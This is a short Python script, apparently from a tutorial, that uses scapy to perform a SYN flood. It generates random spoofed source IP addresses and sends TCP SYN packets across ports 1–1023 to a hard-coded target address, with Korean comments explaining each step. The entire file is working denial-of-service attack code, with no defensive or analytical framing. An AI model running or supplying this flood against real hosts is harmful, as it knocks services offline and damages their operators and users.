from scapy.all import *
from random import shuffle

def getRandomIP():
    ipfactors = [x for x in range(256)]
    tmpip = []
    
    for i in range(4):
        shuffle(ipfactors)
        tmpip.append(str(ipfactors[0]))
    randomip = '.'.join(tmpip)
    return randomip

def synAttack(targetip):
    srcip = getRandomIP()
    P_IP = IP(src =srcip, dst = targetip)            #무작위로 생성한 IP주소를 TCP SYN을 보내는 주소로 IP헤더에 설정합니다.
    P_TCP = TCP(dport = range(1,1024), flags = 'S')  #TCP포트 1~1024 사이의 포트번호로 전송할 TCP SYN 패킷을 구성하여,
    packet = P_IP/P_TCP
    srflood(packet, store=0)                        #srflood() 로 SYN Flooding을 수행합니다. 
    
def main():
    targetip = '123.223.221.111'
    synAttack(targetip)
    
if __name__ == '__main__':
    main()